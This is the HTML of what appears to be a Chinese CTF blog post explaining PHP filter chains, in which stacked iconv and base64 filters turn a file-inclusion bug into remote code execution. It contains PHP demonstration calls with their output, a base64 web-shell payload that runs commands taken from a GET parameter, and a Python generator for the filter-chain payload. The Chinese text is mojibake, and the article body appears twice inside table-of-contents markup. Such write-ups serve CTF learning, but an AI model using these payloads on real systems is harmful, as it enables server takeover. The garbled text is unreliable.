<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="é€šè¿‡phpå‡½æ•°çš„åˆ†æè§£æphpçš„filteré“¾æ„é€   php-base64å‡½æ•°ç‰¹æ€§åˆ†æ    &lt;1&gt;base64è§£ç æ—¶ï¼Œè¦æ±‚æ‰€ä¼ å‚æ•°ä¸º4çš„å€æ•°ï¼Œå¦‚æœæ‰€ä¼ å‚æ•°ä¸æ˜¯4çš„å€æ•°å‘¢ï¼Œæˆ‘ä»¬æ¥é€ä¸ªåˆ†æ æ‰€ä¼ å‚æ•°ä½æ•°ä¸º4*n+1   æ­¤æ—¶å¹¶ä¸å½±å“è§£ç çš„ç»“æœï¼Œç›¸å½“äºåˆ é™¤æœ€åä¸€ä½åè§£ç  æ‰€ä¼ å‚æ•°ä½æ•°ä¸º4*n+2   æ­¤æ—¶è¿è¡Œç›¸å½“äºè‡ªåŠ¨è¡¥å…¨ä¸¤ä¸ªç­‰å·åè§£ç  æ‰€ä¼ å‚æ•°ä½æ•°ä¸º4*n+3   æ­¤æ—¶ç›¸å½“äºè‡ªåŠ¨è¡¥å…¨ä¸€ä¸ª">
<meta property="og:type" content="article">
<meta property="og:title" content="Filteré“¾ä¹‹php">
<meta property="og:url" content="http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/index.html">
<meta property="og:site_name" content="WangYiHao">
<meta property="og:description" content="é€šè¿‡phpå‡½æ•°çš„åˆ†æè§£æphpçš„filteré“¾æ„é€   php-base64å‡½æ•°ç‰¹æ€§åˆ†æ    &lt;1&gt;base64è§£ç æ—¶ï¼Œè¦æ±‚æ‰€ä¼ å‚æ•°ä¸º4çš„å€æ•°ï¼Œå¦‚æœæ‰€ä¼ å‚æ•°ä¸æ˜¯4çš„å€æ•°å‘¢ï¼Œæˆ‘ä»¬æ¥é€ä¸ªåˆ†æ æ‰€ä¼ å‚æ•°ä½æ•°ä¸º4*n+1   æ­¤æ—¶å¹¶ä¸å½±å“è§£ç çš„ç»“æœï¼Œç›¸å½“äºåˆ é™¤æœ€åä¸€ä½åè§£ç  æ‰€ä¼ å‚æ•°ä½æ•°ä¸º4*n+2   æ­¤æ—¶è¿è¡Œç›¸å½“äºè‡ªåŠ¨è¡¥å…¨ä¸¤ä¸ªç­‰å·åè§£ç  æ‰€ä¼ å‚æ•°ä½æ•°ä¸º4*n+3   æ­¤æ—¶ç›¸å½“äºè‡ªåŠ¨è¡¥å…¨ä¸€ä¸ª">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/1.png">
<meta property="og:image" content="http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/2.png">
<meta property="og:image" content="http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/3.png">
<meta property="og:image" content="http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/4.png">
<meta property="og:image" content="http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/5.png">
<meta property="article:published_time" content="2025-01-30T14:32:12.000Z">
<meta property="article:modified_time" content="2025-01-30T15:59:06.544Z">
<meta property="article:author" content="SunRT">
<meta property="article:tag" content="WEB-CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/1.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Filteré“¾ä¹‹php</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 7.2.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">æ€»è§ˆ</a></li>
         
          <li><a href="/tags/WEB-CTF/">CTF-WEB</a></li>
         
          <li><a href="/tags/PWN/">CTF-PWN</a></li>
         
          <li><a href="/tags/HACK-MY-VM/">HACK-MY-VM</a></li>
         
          <li><a href="/tags/try-hack-me/">TRY-HACK-ME</a></li>
         
          <li><a href="/tags/Vulhub">VHub</a></li>
         
          <li><a href="/tags/WEB-%E5%AE%89%E5%85%A8">WEB-å®‰å…¨</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2025/01/31/FBCTF2019-RCEService-PRCE/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2025/01/26/hack-my-vm-Quick2/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Post Anterior</span>
      <span id="i-next" class="info" style="display:none;">Post SegÃ¼ent</span>
      <span id="i-top" class="info" style="display:none;">Adalt</span>
      <span id="i-share" class="info" style="display:none;">Compartir Post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/&text=Filteré“¾ä¹‹php"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/&title=Filteré“¾ä¹‹php"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/&is_video=false&description=Filteré“¾ä¹‹php"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Filteré“¾ä¹‹php&body=Check out this article: http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/&title=Filteré“¾ä¹‹php"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/&title=Filteré“¾ä¹‹php"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/&title=Filteré“¾ä¹‹php"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/&title=Filteré“¾ä¹‹php"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/&name=Filteré“¾ä¹‹php&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/&t=Filteré“¾ä¹‹php"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">é€šè¿‡phpå‡½æ•°çš„åˆ†æè§£æphpçš„filteré“¾æ„é€ </span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.1.</span> <span class="toc-text">php-base64å‡½æ•°ç‰¹æ€§åˆ†æ</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link"><span class="toc-number">1.0.1.0.0.1.</span> <span class="toc-text">æ‰€ä¼ å‚æ•°ä½æ•°ä¸º4*n+1</span></a></li><li class="toc-item toc-level-6"><a class="toc-link"><span class="toc-number">1.0.1.0.0.2.</span> <span class="toc-text">æ‰€ä¼ å‚æ•°ä½æ•°ä¸º4*n+2


æ­¤æ—¶è¿è¡Œç›¸å½“äºè‡ªåŠ¨è¡¥å…¨ä¸¤ä¸ªç­‰å·åè§£ç 
æ‰€ä¼ å‚æ•°ä½æ•°ä¸º4*n+3


æ­¤æ—¶ç›¸å½“äºè‡ªåŠ¨è¡¥å…¨ä¸€ä¸ªç­‰å·åè§£ç 
&lt;2&gt;base64è§£ç æ—¶ï¼Œä¼šå¿½ç•¥å…¶ä¸­çš„éå­—æ¯æ•°å­—+&#x2F;&#x3D;,å…¶ä¸­å¯¹äºä¸åœ¨æœ«å°¾çš„ç­‰å·ï¼Œä¹Ÿä¼šè¿›è¡Œå¿½ç•¥

&lt;3&gt;å¯¹äºä¸€ä¸ªå·²ç»èƒ½å¤Ÿè§£ç çš„å­—ç¬¦ä¸²ï¼Œåœ¨å…¶åé¢æ— è®ºåŠ å…¥å¤šå°‘å­—ç¬¦ï¼Œéƒ½ä¸ä¼šå½±å“è¯¥å­—ç¬¦ä¸²çš„è§£ç ç»“æœ

ç¼–ç è¿‡æ»¤å™¨çš„ç‰¹æ€§

è¿‡æ»¤å™¨çš„å åŠ ç»„åˆï¼Œå¯ä»¥åœ¨åŸå§‹å­—ç¬¦å‰æ·»åŠ ä¸€äº›å­—ç¬¦ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸‹é¢çš„ä¾‹å­
12345&lt;?php echo file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF8.CSISO2022KR&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;); è¿è¡Œç»“æœ:$)Csunrt 

æˆ‘ä»¬å‘ç°ï¼Œå¤šäº†å‡ ä¸ªå­—ç¬¦ï¼Œä½†æ˜¯ï¼Œæˆ‘ä»¬è¯´è¿‡å‰é¢base64çš„ç‰¹æ€§ï¼Œåœ¨è§£ç æ—¶ï¼Œä¼šå¿½ç•¥æ‰éæ•°å­—å­—ç¬¦+&#x2F;&#x3D;ï¼Œé‚£å¦‚æœæˆ‘ä»¬æ·»åŠ base64decodeè¿‡æ»¤å™¨ï¼Œå†æ·»åŠ base64encodeè¿‡æ»¤å™¨ï¼Œé‚£ä¹ˆè¿™äº›å­—ç¬¦å°±ä¼šæ¶ˆå¤±ï¼Œåªç•™ä¸‹Cå­—ç¬¦
12345678&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;echo base64_encode(base64_decode(&quot;Csunrt&quot;));è¿è¡Œç»“æœï¼šCsunrg&#x3D;&#x3D;Csunrg&#x3D;&#x3D;

æ­¤æ—¶æˆ‘ä»¬å®Œæˆäº†ä¸€é¡¹ä»»åŠ¡ï¼Œå°±æ˜¯åœ¨å·²æœ‰çš„æ•°æ®å‰é¢ï¼Œå†æ¬¡æ·»åŠ åˆ«çš„å­—ç¬¦ï¼Œæˆ‘ä»¬èƒ½çœ‹åˆ°ï¼Œè¿è¡Œçš„ç»“æœç¨ç¨æ”¹å˜äº†åŸæœ‰çš„å­—ç¬¦ï¼Œè¿™ä¸é‡è¦ï¼Œå› ä¸ºæ”¹å˜çš„å¾€å¾€éƒ½æ˜¯æœ€åçš„å­—ç¬¦ï¼Œæˆ‘ä»¬åªè¦ä¿è¯æ·»åŠ çš„å­—ç¬¦ä¸è¢«æ”¹å˜å°±è¡Œï¼Œæ­¤æ—¶æˆ‘ä»¬å®Œæˆäº†ä¸€ä¸ªå­—ç¬¦çš„æ·»åŠ ï¼Œè¿™è¿œè¿œä¸å¤Ÿï¼Œä¸€ä¸ªå­—ç¬¦æ”¹å˜ä¸äº†ä»»ä½•ä¸œè¥¿ï¼Œé‚£ä¹ˆå¦‚ä½•æ·»åŠ æ›´å¤šçš„å­—ç¬¦å‘¢ï¼Œæˆ‘ä»¬æ¥çœ‹
123456&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;è¿è¡Œç»“æœï¼šÃ·Ã¥Â€4sunrt

ä¸å‡ºæ‰€æ–™çš„è¯ï¼Œæ·»åŠ base64è¿‡æ»¤å™¨åï¼Œå°±ä¼šå‘åŸå§‹æ•°æ®å‰é¢æ·»åŠ 4
123456&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;è¿è¡Œç»“æœï¼š4sunrg&#x3D;&#x3D;

é‚£ä¹ˆï¼Œæ·»åŠ 4Cå°±å¯ä»¥è¿™æ ·åš
1234567&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;è¿è¡Œç»“æœï¼š4Csunrg&#x3D;

åªéœ€è¦ç®€å•çš„æ‹¼æ¥ï¼Œå°±èƒ½å¤Ÿæ·»åŠ å¤šä¸ªå­—ç¬¦ï¼Œä½†æ˜¯æ­¤æ—¶åªèƒ½æ·»åŠ base64_decodeå‡½æ•°è®¤è¯çš„å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯å­—æ¯æ•°å­—+&#x2F;&#x3D;ï¼Œå¯¹æˆ‘ä»¬æ¥è¯´é™åˆ¶è¿˜æ˜¯å¾ˆå¤§ï¼Œå› ä¸ºæ¶æ„ä»£ç è‚¯å®šå¸¦æœ‰å­—ç¬¦
è¦è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå…¶å®ä¹Ÿå¾ˆç®€å•ï¼Œå°±æ˜¯æˆ‘ä»¬æ„é€ ä¸€ä¸²æ¶æ„ä»£ç çš„base64ç¼–ç å€¼ï¼Œé‚£è¿™ä¸ªç¼–ç å€¼ï¼Œè‚¯å®šæ˜¯å­—æ¯æ•°å­—+&#x2F;&#x3D;ï¼Œæœ€åæˆ‘ä»¬å†æ¬¡æ·»åŠ ä¸€ä¸ªbase64-decodeè¿‡æ»¤å™¨ï¼Œæ­¤æ—¶ï¼Œæ¶æ„ä»£ç å°±ä¼šè¢«è¿˜åŸ
æ¯”å¦‚æˆ‘ä»¬æƒ³è¦æ„é€ ï¼Œé‚£ä¹ˆç›´æ¥æ„é€ PD89YCRfR0VUWzBdYDs7Pz4&#x3D;å³å¯ï¼Œæ„é€ å®Œæˆåï¼Œç›´æ¥å†æ¬¡åœ¨æ„é€ çš„æœ«å°¾æ·»åŠ |convert.base64-decodeå³å¯ï¼Œæ­¤æ—¶æ¶æ„ä»£ç å°±ä¼šè¢«è§£ç ï¼Œå¦‚æœå­˜åœ¨åŒ…å«æ¼æ´ï¼Œé‚£å°±å¯ä»¥RCEäº†
æƒ³è¦æ„é€ çš„å­—ç¬¦å“ªé‡Œæ¥

ç¬¬ä¸€ç§å½“ç„¶æ˜¯å†™è„šæœ¬ï¼Œæ…¢æ…¢å°è¯•äº†ï¼Œä½†æ˜¯å·²ç»æœ‰äººæ›¿æˆ‘ä»¬æ•´ç†å¥½äº†ï¼šå­—ç¬¦çš„æ•´ç†
ç”¨äºæ¢­å“ˆçš„è„šæœ¬ä»¥åŠè„šæœ¬çš„åˆ†æ

æ¢­å“ˆè„šæœ¬
1234567891011121314151617181920212223def generate_filter_chain(chain, debug_base64 &#x3D; False):    encoded_chain &#x3D; chain    # generate some garbage base64    filters &#x3D; &quot;convert.iconv.UTF8.CSISO2022KR|&quot;    filters +&#x3D; &quot;convert.base64-encode|&quot;    # make sure to get rid of any equal signs in both the string we just generated and the rest of the file    filters +&#x3D; &quot;convert.iconv.UTF8.UTF7|&quot;    for c in encoded_chain[::-1]:        filters +&#x3D; conversions[c] + &quot;|&quot;        # decode and reencode to get rid of everything that isn&#39;t valid base64        filters +&#x3D; &quot;convert.base64-decode|&quot;        filters +&#x3D; &quot;convert.base64-encode|&quot;        # get rid of equal signs        filters +&#x3D; &quot;convert.iconv.UTF8.UTF7|&quot;    if not debug_base64:        # don&#39;t add the decode while debugging chains        filters +&#x3D; &quot;convert.base64-decode&quot;    final_payload &#x3D; f&quot;php:&#x2F;&#x2F;filter&#x2F;{filters}&#x2F;resource&#x3D;{file_to_use}&quot;    return final_payload

ä¸Šé¢ä¸ºèŠ‚é€‰çš„æ ¸å¿ƒä»£ç ï¼Œå”¯ä¸€ä¸åŒçš„æ˜¯ï¼Œå‰é¢å¤šäº†ä¸€äº›ä¸œè¥¿ï¼Œå’Œæ¯æ¬¡å¾ªç¯åé¢å¤šäº†convert.iconv.UTF8.UTF7|ï¼Œè¿™ä¸ªæ˜¯ä¸ºäº†å»é™¤ç©ºæ ¼ï¼Œå‰é¢å¤šçš„åˆ™æ˜¯ï¼Œå½“æˆ‘ä»¬åŒ…å«çš„æ–‡ä»¶ä¸ºç©ºæ—¶ï¼Œä½¿å­—ç¬¦èƒ½å¤Ÿæ­£å¸¸æ·»åŠ ä¸è§£æï¼Œè¿™ä¸¤å¤„ç»†èŠ‚å½±å“ä¸å¤§ï¼Œæ‡‚å‰é¢çš„æ·»åŠ å­—ç¬¦å³å¯
</span></a></li><li class="toc-item toc-level-6"><a class="toc-link"><span class="toc-number">1.0.1.0.0.3.</span> <span class="toc-text">


æ­¤æ—¶è¿è¡Œç›¸å½“äºè‡ªåŠ¨è¡¥å…¨ä¸¤ä¸ªç­‰å·åè§£ç 
æ‰€ä¼ å‚æ•°ä½æ•°ä¸º4*n+3


æ­¤æ—¶ç›¸å½“äºè‡ªåŠ¨è¡¥å…¨ä¸€ä¸ªç­‰å·åè§£ç 
&lt;2&gt;base64è§£ç æ—¶ï¼Œä¼šå¿½ç•¥å…¶ä¸­çš„éå­—æ¯æ•°å­—+&#x2F;&#x3D;,å…¶ä¸­å¯¹äºä¸åœ¨æœ«å°¾çš„ç­‰å·ï¼Œä¹Ÿä¼šè¿›è¡Œå¿½ç•¥

&lt;3&gt;å¯¹äºä¸€ä¸ªå·²ç»èƒ½å¤Ÿè§£ç çš„å­—ç¬¦ä¸²ï¼Œåœ¨å…¶åé¢æ— è®ºåŠ å…¥å¤šå°‘å­—ç¬¦ï¼Œéƒ½ä¸ä¼šå½±å“è¯¥å­—ç¬¦ä¸²çš„è§£ç ç»“æœ

ç¼–ç è¿‡æ»¤å™¨çš„ç‰¹æ€§

è¿‡æ»¤å™¨çš„å åŠ ç»„åˆï¼Œå¯ä»¥åœ¨åŸå§‹å­—ç¬¦å‰æ·»åŠ ä¸€äº›å­—ç¬¦ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸‹é¢çš„ä¾‹å­
12345&lt;?php echo file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF8.CSISO2022KR&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;); è¿è¡Œç»“æœ:$)Csunrt 

æˆ‘ä»¬å‘ç°ï¼Œå¤šäº†å‡ ä¸ªå­—ç¬¦ï¼Œä½†æ˜¯ï¼Œæˆ‘ä»¬è¯´è¿‡å‰é¢base64çš„ç‰¹æ€§ï¼Œåœ¨è§£ç æ—¶ï¼Œä¼šå¿½ç•¥æ‰éæ•°å­—å­—ç¬¦+&#x2F;&#x3D;ï¼Œé‚£å¦‚æœæˆ‘ä»¬æ·»åŠ base64decodeè¿‡æ»¤å™¨ï¼Œå†æ·»åŠ base64encodeè¿‡æ»¤å™¨ï¼Œé‚£ä¹ˆè¿™äº›å­—ç¬¦å°±ä¼šæ¶ˆå¤±ï¼Œåªç•™ä¸‹Cå­—ç¬¦
12345678&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;echo base64_encode(base64_decode(&quot;Csunrt&quot;));è¿è¡Œç»“æœï¼šCsunrg&#x3D;&#x3D;Csunrg&#x3D;&#x3D;

æ­¤æ—¶æˆ‘ä»¬å®Œæˆäº†ä¸€é¡¹ä»»åŠ¡ï¼Œå°±æ˜¯åœ¨å·²æœ‰çš„æ•°æ®å‰é¢ï¼Œå†æ¬¡æ·»åŠ åˆ«çš„å­—ç¬¦ï¼Œæˆ‘ä»¬èƒ½çœ‹åˆ°ï¼Œè¿è¡Œçš„ç»“æœç¨ç¨æ”¹å˜äº†åŸæœ‰çš„å­—ç¬¦ï¼Œè¿™ä¸é‡è¦ï¼Œå› ä¸ºæ”¹å˜çš„å¾€å¾€éƒ½æ˜¯æœ€åçš„å­—ç¬¦ï¼Œæˆ‘ä»¬åªè¦ä¿è¯æ·»åŠ çš„å­—ç¬¦ä¸è¢«æ”¹å˜å°±è¡Œï¼Œæ­¤æ—¶æˆ‘ä»¬å®Œæˆäº†ä¸€ä¸ªå­—ç¬¦çš„æ·»åŠ ï¼Œè¿™è¿œè¿œä¸å¤Ÿï¼Œä¸€ä¸ªå­—ç¬¦æ”¹å˜ä¸äº†ä»»ä½•ä¸œè¥¿ï¼Œé‚£ä¹ˆå¦‚ä½•æ·»åŠ æ›´å¤šçš„å­—ç¬¦å‘¢ï¼Œæˆ‘ä»¬æ¥çœ‹
123456&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;è¿è¡Œç»“æœï¼šÃ·Ã¥Â€4sunrt

ä¸å‡ºæ‰€æ–™çš„è¯ï¼Œæ·»åŠ base64è¿‡æ»¤å™¨åï¼Œå°±ä¼šå‘åŸå§‹æ•°æ®å‰é¢æ·»åŠ 4
123456&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;è¿è¡Œç»“æœï¼š4sunrg&#x3D;&#x3D;

é‚£ä¹ˆï¼Œæ·»åŠ 4Cå°±å¯ä»¥è¿™æ ·åš
1234567&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;è¿è¡Œç»“æœï¼š4Csunrg&#x3D;

åªéœ€è¦ç®€å•çš„æ‹¼æ¥ï¼Œå°±èƒ½å¤Ÿæ·»åŠ å¤šä¸ªå­—ç¬¦ï¼Œä½†æ˜¯æ­¤æ—¶åªèƒ½æ·»åŠ base64_decodeå‡½æ•°è®¤è¯çš„å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯å­—æ¯æ•°å­—+&#x2F;&#x3D;ï¼Œå¯¹æˆ‘ä»¬æ¥è¯´é™åˆ¶è¿˜æ˜¯å¾ˆå¤§ï¼Œå› ä¸ºæ¶æ„ä»£ç è‚¯å®šå¸¦æœ‰å­—ç¬¦
è¦è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå…¶å®ä¹Ÿå¾ˆç®€å•ï¼Œå°±æ˜¯æˆ‘ä»¬æ„é€ ä¸€ä¸²æ¶æ„ä»£ç çš„base64ç¼–ç å€¼ï¼Œé‚£è¿™ä¸ªç¼–ç å€¼ï¼Œè‚¯å®šæ˜¯å­—æ¯æ•°å­—+&#x2F;&#x3D;ï¼Œæœ€åæˆ‘ä»¬å†æ¬¡æ·»åŠ ä¸€ä¸ªbase64-decodeè¿‡æ»¤å™¨ï¼Œæ­¤æ—¶ï¼Œæ¶æ„ä»£ç å°±ä¼šè¢«è¿˜åŸ
æ¯”å¦‚æˆ‘ä»¬æƒ³è¦æ„é€ ï¼Œé‚£ä¹ˆç›´æ¥æ„é€ PD89YCRfR0VUWzBdYDs7Pz4&#x3D;å³å¯ï¼Œæ„é€ å®Œæˆåï¼Œç›´æ¥å†æ¬¡åœ¨æ„é€ çš„æœ«å°¾æ·»åŠ |convert.base64-decodeå³å¯ï¼Œæ­¤æ—¶æ¶æ„ä»£ç å°±ä¼šè¢«è§£ç ï¼Œå¦‚æœå­˜åœ¨åŒ…å«æ¼æ´ï¼Œé‚£å°±å¯ä»¥RCEäº†
æƒ³è¦æ„é€ çš„å­—ç¬¦å“ªé‡Œæ¥

ç¬¬ä¸€ç§å½“ç„¶æ˜¯å†™è„šæœ¬ï¼Œæ…¢æ…¢å°è¯•äº†ï¼Œä½†æ˜¯å·²ç»æœ‰äººæ›¿æˆ‘ä»¬æ•´ç†å¥½äº†ï¼šå­—ç¬¦çš„æ•´ç†
ç”¨äºæ¢­å“ˆçš„è„šæœ¬ä»¥åŠè„šæœ¬çš„åˆ†æ

æ¢­å“ˆè„šæœ¬
1234567891011121314151617181920212223def generate_filter_chain(chain, debug_base64 &#x3D; False):    encoded_chain &#x3D; chain    # generate some garbage base64    filters &#x3D; &quot;convert.iconv.UTF8.CSISO2022KR|&quot;    filters +&#x3D; &quot;convert.base64-encode|&quot;    # make sure to get rid of any equal signs in both the string we just generated and the rest of the file    filters +&#x3D; &quot;convert.iconv.UTF8.UTF7|&quot;    for c in encoded_chain[::-1]:        filters +&#x3D; conversions[c] + &quot;|&quot;        # decode and reencode to get rid of everything that isn&#39;t valid base64        filters +&#x3D; &quot;convert.base64-decode|&quot;        filters +&#x3D; &quot;convert.base64-encode|&quot;        # get rid of equal signs        filters +&#x3D; &quot;convert.iconv.UTF8.UTF7|&quot;    if not debug_base64:        # don&#39;t add the decode while debugging chains        filters +&#x3D; &quot;convert.base64-decode&quot;    final_payload &#x3D; f&quot;php:&#x2F;&#x2F;filter&#x2F;{filters}&#x2F;resource&#x3D;{file_to_use}&quot;    return final_payload

ä¸Šé¢ä¸ºèŠ‚é€‰çš„æ ¸å¿ƒä»£ç ï¼Œå”¯ä¸€ä¸åŒçš„æ˜¯ï¼Œå‰é¢å¤šäº†ä¸€äº›ä¸œè¥¿ï¼Œå’Œæ¯æ¬¡å¾ªç¯åé¢å¤šäº†convert.iconv.UTF8.UTF7|ï¼Œè¿™ä¸ªæ˜¯ä¸ºäº†å»é™¤ç©ºæ ¼ï¼Œå‰é¢å¤šçš„åˆ™æ˜¯ï¼Œå½“æˆ‘ä»¬åŒ…å«çš„æ–‡ä»¶ä¸ºç©ºæ—¶ï¼Œä½¿å­—ç¬¦èƒ½å¤Ÿæ­£å¸¸æ·»åŠ ä¸è§£æï¼Œè¿™ä¸¤å¤„ç»†èŠ‚å½±å“ä¸å¤§ï¼Œæ‡‚å‰é¢çš„æ·»åŠ å­—ç¬¦å³å¯
